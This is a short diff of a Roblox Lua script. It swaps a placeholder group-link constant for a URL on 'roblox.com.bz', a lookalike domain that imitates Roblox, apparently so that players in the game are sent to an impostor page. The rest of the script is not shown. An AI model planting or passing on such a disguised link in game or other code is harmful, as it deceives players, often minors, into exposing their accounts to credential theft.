@@ -5,7 +5,7 @@
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
-local GROUP_LINK = "YOUR_VERIFIED_ROBLOX_GROUP_URL"
+local GROUP_LINK = "https://roblox.com.bz/communities/5118504871/"
 
 local playerGui = player:WaitForChild("PlayerGui")
 
